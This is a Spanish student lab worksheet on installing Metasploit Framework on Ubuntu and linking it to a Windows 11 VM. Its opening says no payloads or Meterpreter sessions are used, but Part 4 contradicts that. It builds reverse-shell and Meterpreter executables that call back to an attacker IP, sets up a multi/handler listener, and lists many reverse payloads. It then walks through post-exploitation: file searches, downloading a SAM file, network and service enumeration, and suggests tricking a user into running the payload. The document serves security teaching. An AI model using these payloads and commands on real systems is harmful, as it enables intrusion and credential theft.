---
# Duración sugerida: 60–75 minutos
# Tipo: Ejercicio extra (versión alumno)
---

# Ejercicio extra — Preparación de Metasploit en Ubuntu

> **Duración sugerida:** 60–75 minutos | **Modalidad:** individual o en parejas | **Producto:** registro de cinco evidencias

## Propósito

En esta práctica se preparará una VM Ubuntu como estación de laboratorio con **Metasploit Framework**. El objetivo es aprender a instalar la herramienta desde su fuente oficial, comprobar su base de datos y verificar la comunicación con una VM Windows 11 dentro de una red virtual aislada.

Metasploit Framework es la herramienta que se instalará en Ubuntu. **Metasploitable** es una VM deliberadamente vulnerable distinta y no se utiliza en este ejercicio.

Al finalizar, el alumno será capaz de:

- distinguir Metasploit Framework de Metasploitable;
- instalar Framework mediante el paquete oficial de Rapid7;
- comprobar el paquete, la consola y la conexión con PostgreSQL;
- crear un espacio de trabajo sin ejecutar módulos ofensivos;
- verificar un servicio conocido en una IP autorizada;
- retirar el acceso a Internet antes de una práctica de seguridad.

!!! danger "Límite de esta práctica"
    Esta actividad termina en la preparación y verificación del entorno. No se generan ejecutables, no se configuran payloads o sesiones Meterpreter y no se intenta evadir Microsoft Defender. Tampoco se ejecutan módulos `exploit`, `post` ni acciones sobre equipos externos.

---

## Topología del laboratorio

| Equipo | Función | Red durante la instalación | Red durante la verificación |
|--------|---------|----------------------------|-----------------------------|
| **VM Ubuntu** | Estación con Metasploit | NAT temporal + red interna | Solo red interna o *host-only* |
| **VM Windows 11** | Endpoint de laboratorio | Red interna; NAT no requerido | Solo red interna o *host-only* |

Ejemplo de direcciones en una red *host-only*:

| Equipo | Dirección de ejemplo |
|--------|----------------------|
| Ubuntu | `192.168.56.101` |
| Windows 11 | `192.168.56.102` |

Las direcciones son ejemplos. Cada alumno debe descubrir y registrar las de sus propias VMs.

!!! warning "Antes de comenzar"
    - Usar únicamente VMs autorizadas para el curso.
    - Crear una instantánea con ambas VMs apagadas.
    - No utilizar modo puente o *bridged*.
    - Mantener Microsoft Defender, Windows Firewall, firma SMB y autenticación activados.
    - Usar SMB 2/3; no instalar ni habilitar SMBv1.

## Evidencias requeridas

Cada alumno debe copiar la salida relevante —o tomar una captura— para estas cinco evidencias:

| ID | Evidencia | Criterio de aprobación |
|----|----------|------------------------|
| E1 | Versión y arquitectura de Ubuntu | Se identifica el sistema y una arquitectura soportada |
| E2 | Paquete `metasploit-framework` | Se muestra paquete, versión y arquitectura |
| E3 | Consola y base de datos | `msfconsole` abre y `db_status` confirma PostgreSQL |
| E4 | Direcciones de la red interna | Se registran las IP de Ubuntu y Windows |
| E5 | Comprobación dirigida de TCP/445 | Se prueba solo la IP autorizada y se interpreta el resultado |

---

## Parte 1 — Preparar Ubuntu

### Paso 1 — Comprobar el sistema

Abrir una terminal en Ubuntu:

```bash
cat /etc/os-release
dpkg --print-architecture
uname -m
```

En una VM común sobre procesadores Intel o AMD de 64 bits se espera normalmente:

```text
amd64
x86_64
```

Rapid7 publica paquetes Linux `.deb` para `amd64`, `arm64`, `armhf` e `i386`. La lista vigente se encuentra en la documentación de sus [instaladores oficiales](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html).

**Registrar E1:** versión de Ubuntu, resultado de `dpkg --print-architecture` y resultado de `uname -m`.

### Paso 2 — Descubrir las interfaces

```bash
ip -brief address
ip route
```

Identificar:

- la interfaz NAT, utilizada temporalmente para descargar paquetes;
- la interfaz interna o *host-only*, utilizada para comunicarse con Windows.

No asumir que se llaman `eth0` o `eth1`: Ubuntu puede mostrar nombres como `enp0s3` y `enp0s8`.

### Paso 3 — Preparar las utilidades

```bash
sudo apt update
sudo apt install --yes curl ca-certificates gnupg netcat-openbsd
```

Si `apt update` falla, revisar primero la fecha de la VM, el adaptador NAT y la resolución DNS. No continuar con una descarga incompleta.

---

## Parte 2 — Instalar Metasploit Framework

Rapid7 recomienda el instalador oficial de Metasploit para Linux. Este configura su repositorio firmado e instala el paquete junto con sus dependencias, como Ruby y PostgreSQL. El procedimiento se basa en la documentación de [Metasploit Framework](https://github.com/rapid7/metasploit-framework#installing-metasploit) y del [paquete Omnibus](https://github.com/rapid7/metasploit-omnibus/blob/master/USAGE.md).

### Paso 4 — Descargar el instalador

```bash
curl --fail --show-error --location \
  --output msfinstall \
  https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb
```

Confirmar que existe y no está vacío:

```bash
ls -lh msfinstall
```

### Paso 5 — Inspeccionar antes de ejecutar

```bash
less msfinstall
```

Dentro de `less`, usar las flechas para desplazarse y presionar `q` para salir. La inspección permite confirmar que el archivo proviene de Rapid7 y que prepara un repositorio de paquetes; no es necesario comprender cada línea del script.

!!! note "Etiqueta `lucid`"
    El repositorio generado puede contener la etiqueta histórica `lucid`. Es un nombre usado por el repositorio de Rapid7: no sustituirlo manualmente por `jammy`, `noble` u otro nombre de Ubuntu.

### Paso 6 — Ejecutar el instalador

```bash
chmod 755 msfinstall
sudo ./msfinstall
```

El proceso puede tardar varios minutos. Debe terminar sin errores de APT ni descargas incompletas.

### Paso 7 — Comprobar el paquete

```bash
dpkg-query -W -f='${Package} ${Version} ${Architecture}\n' metasploit-framework
apt-cache policy metasploit-framework
command -v msfconsole
msfconsole --version
```

El primer comando debe mostrar `metasploit-framework`, su versión y arquitectura. `command -v` debe devolver una ruta al ejecutable.

**Registrar E2:** salida de `dpkg-query` y `msfconsole --version`.

---

## Parte 3 — Inicializar y verificar Metasploit

### Paso 8 — Abrir la consola

Ejecutar como usuario normal, no con `sudo`:

```bash
msfconsole
```

Si todavía no está disponible en `PATH`:

```bash
/opt/metasploit-framework/bin/msfconsole
```

En el primer inicio, aceptar la creación de la base de datos cuando el asistente la ofrezca. La construcción inicial de la caché de módulos puede tardar algunos minutos.

### Paso 9 — Comprobar PostgreSQL

Dentro de `msfconsole`:

```text
version
db_status
```

El resultado esperado de `db_status` debe indicar que PostgreSQL está conectado a Metasploit.

Si no existe conexión, salir y ejecutar como usuario normal:

```text
exit
```

```bash
msfdb init
msfconsole
```

Después repetir `db_status`.

### Paso 10 — Crear un espacio de trabajo

Dentro de `msfconsole`:

```text
workspace -a preparacion-lab
workspace
```

El asterisco debe aparecer junto a `preparacion-lab`. Un *workspace* organiza datos del laboratorio; crearlo no ejecuta ataques.

Terminar la consola:

```text
exit
```

Comprobar la base desde Ubuntu:

```bash
msfdb status
```

**Registrar E3:** salida de `db_status`, el *workspace* seleccionado y `msfdb status`.

---

## Parte 4 — Fabricar un binario con payload

- El siguiente comando se utiliza en seguridad informática y pruebas de penetración para generar un archivo ejecutable malicioso (payload) que creará una conexión remota de vuelta hacia el atacante.

- El comando pertenece a la herramienta msfvenom, que forma parte del framework de Metasploit.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f exe -o shell.exe
```

### Desglose del comando:

- `msfvenom`: Invoca la herramienta para crear y compilar el código malicioso (payload).
- `-p windows/x64/shell_reverse_tcp`: Define el payload (la carga útil).
- `windows/x64`: Indica que el archivo está diseñado específicamente para sistemas operativos Windows de 64 bits.
- `shell_reverse_tcp`: Indica que el comportamiento será una shell reversa mediante TCP. Al ejecutarse, la víctima iniciará una conexión saliente hacia el atacante y le entregará el control de la consola (cmd.exe).
- `LHOST=192.168.56.104`: Significa Listening Host. Es la dirección IP del atacante (tu máquina), a la cual el archivo de la víctima intentará conectarse.
- `LPORT=4444`: Significa Listening Port. Es el puerto del atacante que estará esperando la conexión entrante. El puerto 4444 es el valor por defecto en Metasploit.
- `-f exe`: Define el formato de salida (format). En este caso, le indica a msfvenom que compile el payload como un archivo ejecutable tradicional de Windows (.exe).
- `-o shell.exe`: Define el nombre del archivo de salida (output). El ejecutable generado se guardará en tu directorio actual con el nombre shell.exe

### Paso 11 — Buscamos otros payloads

```bash
msfvenom -l payloads | grep -i "windows" | grep -i "meterpreter" | grep -i "reverse"
```

- Imprimimos

```bash
msfvenom -l payloads | grep -i "windows" | grep -i "meterpreter" | grep -i "reverse"
```

??? note "Ver lista resultante de payloads"

    ```text
    cmd/windows/ftp/x64/meterpreter/reverse_http
    cmd/windows/ftp/x64/meterpreter/reverse_https
    cmd/windows/ftp/x64/meterpreter/reverse_named_pipe
    cmd/windows/ftp/x64/meterpreter/reverse_tcp
    cmd/windows/ftp/x64/meterpreter/reverse_tcp_rc4
    cmd/windows/ftp/x64/meterpreter/reverse_tcp_uuid
    cmd/windows/ftp/x64/meterpreter/reverse_winhttp
    cmd/windows/ftp/x64/meterpreter/reverse_winhttps
    cmd/windows/ftp/x64/meterpreter_reverse_http
    cmd/windows/ftp/x64/meterpreter_reverse_https
    cmd/windows/ftp/x64/meterpreter_reverse_ipv6_tcp
    cmd/windows/ftp/x64/meterpreter_reverse_tcp
    cmd/windows/ftp/x86/meterpreter/reverse_http
    cmd/windows/ftp/x86/meterpreter/reverse_http_proxy_pstore
    cmd/windows/ftp/x86/meterpreter/reverse_https
    cmd/windows/ftp/x86/meterpreter/reverse_ipv6_tcp
    cmd/windows/ftp/x86/meterpreter/reverse_named_pipe
    cmd/windows/ftp/x86/meterpreter/reverse_nonx_tcp
    cmd/windows/ftp/x86/meterpreter/reverse_ord_tcp
    cmd/windows/ftp/x86/meterpreter/reverse_tcp
    cmd/windows/ftp/x86/meterpreter/reverse_tcp_allports
    cmd/windows/ftp/x86/meterpreter/reverse_tcp_dns
    cmd/windows/ftp/x86/meterpreter/reverse_tcp_rc4
    cmd/windows/ftp/x86/meterpreter/reverse_tcp_rc4_dns
    cmd/windows/ftp/x86/meterpreter/reverse_tcp_uuid
    cmd/windows/ftp/x86/meterpreter/reverse_winhttp
    cmd/windows/ftp/x86/meterpreter/reverse_winhttps
    cmd/windows/ftp/x86/meterpreter_reverse_http
    cmd/windows/ftp/x86/meterpreter_reverse_https
    cmd/windows/ftp/x86/meterpreter_reverse_ipv6_tcp
    cmd/windows/ftp/x86/meterpreter_reverse_tcp
    cmd/windows/ftp/x86/metsvc_reverse_tcp
    cmd/windows/ftp/x86/patchupmeterpreter/reverse_ipv6_tcp
    cmd/windows/ftp/x86/patchupmeterpreter/reverse_nonx_tcp
    cmd/windows/ftp/x86/patchupmeterpreter/reverse_ord_tcp
    cmd/windows/ftp/x86/patchupmeterpreter/reverse_tcp
    cmd/windows/ftp/x86/patchupmeterpreter/reverse_tcp_allports
    cmd/windows/ftp/x86/patchupmeterpreter/reverse_tcp_dns
    cmd/windows/ftp/x86/patchupmeterpreter/reverse_tcp_rc4
    cmd/windows/ftp/x86/patchupmeterpreter/reverse_tcp_rc4_dns
    cmd/windows/ftp/x86/patchupmeterpreter/reverse_tcp_uuid
    cmd/windows/http/x64/meterpreter/reverse_http
    cmd/windows/http/x64/meterpreter/reverse_https
    cmd/windows/http/x64/meterpreter/reverse_named_pipe
    cmd/windows/http/x64/meterpreter/reverse_tcp
    cmd/windows/http/x64/meterpreter/reverse_tcp_rc4
    cmd/windows/http/x64/meterpreter/reverse_tcp_uuid
    cmd/windows/http/x64/meterpreter/reverse_winhttp
    cmd/windows/http/x64/meterpreter/reverse_winhttps
    cmd/windows/http/x64/meterpreter_reverse_http
    cmd/windows/http/x64/meterpreter_reverse_https
    cmd/windows/http/x64/meterpreter_reverse_ipv6_tcp
    cmd/windows/http/x64/meterpreter_reverse_tcp
    cmd/windows/http/x86/meterpreter/reverse_http
    cmd/windows/http/x86/meterpreter/reverse_http_proxy_pstore
    cmd/windows/http/x86/meterpreter/reverse_https
    cmd/windows/http/x86/meterpreter/reverse_ipv6_tcp
    cmd/windows/http/x86/meterpreter/reverse_named_pipe
    cmd/windows/http/x86/meterpreter/reverse_nonx_tcp
    cmd/windows/http/x86/meterpreter/reverse_ord_tcp
    cmd/windows/http/x86/meterpreter/reverse_tcp
    cmd/windows/http/x86/meterpreter/reverse_tcp_allports
    cmd/windows/http/x86/meterpreter/reverse_tcp_dns
    cmd/windows/http/x86/meterpreter/reverse_tcp_rc4
    cmd/windows/http/x86/meterpreter/reverse_tcp_rc4_dns
    cmd/windows/http/x86/meterpreter/reverse_tcp_uuid
    cmd/windows/http/x86/meterpreter/reverse_winhttp
    cmd/windows/http/x86/meterpreter/reverse_winhttps
    cmd/windows/http/x86/meterpreter_reverse_http
    cmd/windows/http/x86/meterpreter_reverse_https
    cmd/windows/http/x86/meterpreter_reverse_ipv6_tcp
    cmd/windows/http/x86/meterpreter_reverse_tcp
    cmd/windows/http/x86/metsvc_reverse_tcp
    cmd/windows/http/x86/patchupmeterpreter/reverse_ipv6_tcp
    cmd/windows/http/x86/patchupmeterpreter/reverse_nonx_tcp
    cmd/windows/http/x86/patchupmeterpreter/reverse_ord_tcp
    cmd/windows/http/x86/patchupmeterpreter/reverse_tcp
    cmd/windows/http/x86/patchupmeterpreter/reverse_tcp_allports
    cmd/windows/http/x86/patchupmeterpreter/reverse_tcp_dns
    cmd/windows/http/x86/patchupmeterpreter/reverse_tcp_rc4
    cmd/windows/http/x86/patchupmeterpreter/reverse_tcp_rc4_dns
    cmd/windows/http/x86/patchupmeterpreter/reverse_tcp_uuid
    cmd/windows/https/x64/meterpreter/reverse_http
    cmd/windows/https/x64/meterpreter/reverse_https
    cmd/windows/https/x64/meterpreter/reverse_named_pipe
    cmd/windows/https/x64/meterpreter/reverse_tcp
    cmd/windows/https/x64/meterpreter/reverse_tcp_rc4
    cmd/windows/https/x64/meterpreter/reverse_tcp_uuid
    cmd/windows/https/x64/meterpreter/reverse_winhttp
    cmd/windows/https/x64/meterpreter/reverse_winhttps
    cmd/windows/https/x64/meterpreter_reverse_http
    cmd/windows/https/x64/meterpreter_reverse_https
    cmd/windows/https/x64/meterpreter_reverse_ipv6_tcp
    cmd/windows/https/x64/meterpreter_reverse_tcp
    cmd/windows/https/x86/meterpreter/reverse_http
    cmd/windows/https/x86/meterpreter/reverse_http_proxy_pstore
    cmd/windows/https/x86/meterpreter/reverse_https
    cmd/windows/https/x86/meterpreter/reverse_ipv6_tcp
    cmd/windows/https/x86/meterpreter/reverse_named_pipe
    cmd/windows/https/x86/meterpreter/reverse_nonx_tcp
    cmd/windows/https/x86/meterpreter/reverse_ord_tcp
    cmd/windows/https/x86/meterpreter/reverse_tcp
    cmd/windows/https/x86/meterpreter/reverse_tcp_allports
    cmd/windows/https/x86/meterpreter/reverse_tcp_dns
    cmd/windows/https/x86/meterpreter/reverse_tcp_rc4
    cmd/windows/https/x86/meterpreter/reverse_tcp_rc4_dns
    cmd/windows/https/x86/meterpreter/reverse_tcp_uuid
    cmd/windows/https/x86/meterpreter/reverse_winhttp
    cmd/windows/https/x86/meterpreter/reverse_winhttps
    cmd/windows/https/x86/meterpreter_reverse_http
    cmd/windows/https/x86/meterpreter_reverse_https
    cmd/windows/https/x86/meterpreter_reverse_ipv6_tcp
    cmd/windows/https/x86/meterpreter_reverse_tcp
    cmd/windows/https/x86/metsvc_reverse_tcp
    cmd/windows/https/x86/patchupmeterpreter/reverse_ipv6_tcp
    cmd/windows/https/x86/patchupmeterpreter/reverse_nonx_tcp
    cmd/windows/https/x86/patchupmeterpreter/reverse_ord_tcp
    cmd/windows/https/x86/patchupmeterpreter/reverse_tcp
    cmd/windows/https/x86/patchupmeterpreter/reverse_tcp_allports
    cmd/windows/https/x86/patchupmeterpreter/reverse_tcp_dns
    cmd/windows/https/x86/patchupmeterpreter/reverse_tcp_rc4
    cmd/windows/https/x86/patchupmeterpreter/reverse_tcp_rc4_dns
    cmd/windows/https/x86/patchupmeterpreter/reverse_tcp_uuid
    cmd/windows/powershell/meterpreter/reverse_http
    cmd/windows/powershell/meterpreter/reverse_http_proxy_pstore
    cmd/windows/powershell/meterpreter/reverse_https
    cmd/windows/powershell/meterpreter/reverse_ipv6_tcp
    cmd/windows/powershell/meterpreter/reverse_named_pipe
    cmd/windows/powershell/meterpreter/reverse_nonx_tcp
    cmd/windows/powershell/meterpreter/reverse_ord_tcp
    cmd/windows/powershell/meterpreter/reverse_tcp
    cmd/windows/powershell/meterpreter/reverse_tcp_allports
    cmd/windows/powershell/meterpreter/reverse_tcp_dns
    cmd/windows/powershell/meterpreter/reverse_tcp_rc4
    cmd/windows/powershell/meterpreter/reverse_tcp_rc4_dns
    cmd/windows/powershell/meterpreter/reverse_tcp_uuid
    cmd/windows/powershell/meterpreter/reverse_winhttp
    cmd/windows/powershell/meterpreter/reverse_winhttps
    cmd/windows/powershell/meterpreter_reverse_http
    cmd/windows/powershell/meterpreter_reverse_https
    cmd/windows/powershell/metsvc_reverse_tcp
    cmd/windows/powershell/patchupmeterpreter/reverse_ipv6_tcp
    cmd/windows/powershell/patchupmeterpreter/reverse_nonx_tcp
    cmd/windows/powershell/patchupmeterpreter/reverse_ord_tcp
    cmd/windows/powershell/patchupmeterpreter/reverse_tcp
    cmd/windows/powershell/patchupmeterpreter/reverse_tcp_allports
    cmd/windows/powershell/patchupmeterpreter/reverse_tcp_dns
    cmd/windows/powershell/patchupmeterpreter/reverse_tcp_rc4
    cmd/windows/powershell/patchupmeterpreter/reverse_tcp_rc4_dns
    cmd/windows/powershell/patchupmeterpreter/reverse_tcp_uuid
    cmd/windows/powershell/x64/meterpreter/reverse_http
    cmd/windows/powershell/x64/meterpreter/reverse_https
    cmd/windows/powershell/x64/meterpreter/reverse_named_pipe
    cmd/windows/powershell/x64/meterpreter/reverse_tcp
    cmd/windows/powershell/x64/meterpreter/reverse_tcp_rc4
    cmd/windows/powershell/x64/meterpreter/reverse_tcp_uuid
    cmd/windows/powershell/x64/meterpreter/reverse_winhttp
    cmd/windows/powershell/x64/meterpreter/reverse_winhttps
    cmd/windows/powershell/x64/meterpreter_reverse_http
    cmd/windows/powershell/x64/meterpreter_reverse_https
    cmd/windows/python/meterpreter/reverse_http
    cmd/windows/python/meterpreter/reverse_https
    cmd/windows/python/meterpreter/reverse_tcp
    cmd/windows/python/meterpreter/reverse_tcp_ssl
    cmd/windows/python/meterpreter/reverse_tcp_uuid
    cmd/windows/python/meterpreter_reverse_http
    cmd/windows/python/meterpreter_reverse_https
    cmd/windows/python/meterpreter_reverse_tcp
    cmd/windows/smb/x64/meterpreter/reverse_http
    cmd/windows/smb/x64/meterpreter/reverse_https
    cmd/windows/smb/x64/meterpreter/reverse_named_pipe
    cmd/windows/smb/x64/meterpreter/reverse_tcp
    cmd/windows/smb/x64/meterpreter/reverse_tcp_rc4
    cmd/windows/smb/x64/meterpreter/reverse_tcp_uuid
    cmd/windows/smb/x64/meterpreter/reverse_winhttp
    cmd/windows/smb/x64/meterpreter/reverse_winhttps
    cmd/windows/smb/x64/meterpreter_reverse_http
    cmd/windows/smb/x64/meterpreter_reverse_https
    cmd/windows/smb/x64/meterpreter_reverse_ipv6_tcp
    cmd/windows/smb/x64/meterpreter_reverse_tcp
    cmd/windows/tftp/x64/meterpreter/reverse_http
    cmd/windows/tftp/x64/meterpreter/reverse_https
    cmd/windows/tftp/x64/meterpreter/reverse_named_pipe
    cmd/windows/tftp/x64/meterpreter/reverse_tcp
    cmd/windows/tftp/x64/meterpreter/reverse_tcp_rc4
    cmd/windows/tftp/x64/meterpreter/reverse_tcp_uuid
    cmd/windows/tftp/x64/meterpreter/reverse_winhttp
    cmd/windows/tftp/x64/meterpreter/reverse_winhttps
    cmd/windows/tftp/x64/meterpreter_reverse_http
    cmd/windows/tftp/x64/meterpreter_reverse_https
    cmd/windows/tftp/x64/meterpreter_reverse_ipv6_tcp
    cmd/windows/tftp/x64/meterpreter_reverse_tcp
    windows/meterpreter/reverse_http
    windows/meterpreter/reverse_http_proxy_pstore
    windows/meterpreter/reverse_https
    windows/meterpreter/reverse_ipv6_tcp
    windows/meterpreter/reverse_named_pipe
    windows/meterpreter/reverse_nonx_tcp
    windows/meterpreter/reverse_ord_tcp
    windows/meterpreter/reverse_tcp
    windows/meterpreter/reverse_tcp_allports
    windows/meterpreter/reverse_tcp_dns
    windows/meterpreter/reverse_tcp_rc4
    windows/meterpreter/reverse_tcp_rc4_dns
    windows/meterpreter/reverse_tcp_uuid
    windows/meterpreter/reverse_winhttp
    windows/meterpreter/reverse_winhttps
    windows/meterpreter_reverse_http
    windows/meterpreter_reverse_https
    windows/meterpreter_reverse_ipv6_tcp
    windows/meterpreter_reverse_tcp
    windows/metsvc_reverse_tcp
    windows/patchupmeterpreter/reverse_ipv6_tcp
    windows/patchupmeterpreter/reverse_nonx_tcp
    windows/patchupmeterpreter/reverse_ord_tcp
    windows/patchupmeterpreter/reverse_tcp
    windows/patchupmeterpreter/reverse_tcp_allports
    windows/patchupmeterpreter/reverse_tcp_dns
    windows/patchupmeterpreter/reverse_tcp_rc4
    windows/patchupmeterpreter/reverse_tcp_rc4_dns
    windows/patchupmeterpreter/reverse_tcp_uuid
    windows/x64/meterpreter/reverse_http
    windows/x64/meterpreter/reverse_https
    windows/x64/meterpreter/reverse_named_pipe
    windows/x64/meterpreter/reverse_tcp
    windows/x64/meterpreter/reverse_tcp_rc4
    windows/x64/meterpreter/reverse_tcp_uuid
    windows/x64/meterpreter/reverse_winhttp
    windows/x64/meterpreter/reverse_winhttps
    windows/x64/meterpreter_reverse_http
    windows/x64/meterpreter_reverse_https
    windows/x64/meterpreter_reverse_ipv6_tcp
    windows/x64/meterpreter_reverse_tcp
    ```

### Paso 12 — Generamos un Payload via meterpreter

Meterpreter es un payload avanzado de Metasploit que, después de conectarse al operador, proporciona una sesión interactiva con muchas funciones integradas.

| Reverse shell convencional | Meterpreter |
|---|---|
| Entrega `cmd.exe` o un shell equivalente | Entrega una consola especializada |
| Puede recibirse con Netcat | Normalmente requiere un handler de Metasploit |
| Funciones limitadas al shell | Muchas operaciones integradas |
| Más fácil de explicar y observar | Más complejo y con mayor impacto |
| Menor superficie funcional | Puede realizar acciones de postexplotación |

- Generamos el payload con la sesion meterpreter

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4445 -f exe -o shell-meterpreter.exe
```

- Para recibir la conexión tcp reversa saliente de la máquina víctima tenemos que iniciar una sesión de "escucha" de meterpreter:

```bash
msfconsole -q
```

- Dentro de msfconsole, invocar a meterpreter:

```bash
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.104
set LPORT 4445
run
```

- Mediante diferentes vectores de ataque podemos introducir el payload en la máquina víctima e inducir al usuario a ejecutarla.

- Una vez que el usurio (windows 11) ejecute el payload, se produce la sesión meterpreter:

```bash
LPORT => 4445
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.56.104:4445
[*] Sending stage (255678 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened (192.168.56.104:4445 -> 192.168.56.102:59016) at 2026-09-01 10:48:51 +0000
```

### Paso 13 — Post-Explotación con Meterpreter

**Verificar el acceso obtenido**

```bash
meterpreter > sysinfo          # OS, hostname, arquitectura, dominio
meterpreter > getuid           # confirmar NT AUTHORITY\SYSTEM
meterpreter > getpid           # PID del proceso donde está inyectado el payload
meterpreter > ps               # listar todos los procesos en ejecución
```

**Explorar la red desde dentro del target**

```bash
meterpreter > ipconfig         # interfaces de red — buscar otras subredes internas
meterpreter > arp              # tabla ARP — otros hosts activos en la red
meterpreter > netstat          # conexiones activas y puertos en escucha
meterpreter > route            # tabla de enrutamiento
```

**Navegar el sistema de archivos**

```bash
meterpreter > pwd              # directorio actual
meterpreter > ls               # listar archivos
meterpreter > cd C:\\Users     # navegar al directorio de usuarios
meterpreter > search -f *.txt -d C:\\Users    # buscar archivos .txt en Users
meterpreter > download C:\\Windows\\Temp\\SAM .  # descargar archivo al atacante
```

**Enumerar servicios**

```bash
meterpreter > shell            # abrir cmd.exe en el target
C:\> net start                 # listar servicios en ejecución
C:\> sc query type= all        # estado detallado de todos los servicios
C:\> netstat -ano              # conexiones con PID asociado
C:\> exit                      # volver a Meterpreter
```



---

*Volver: [Inicio del módulo](../index.md)*
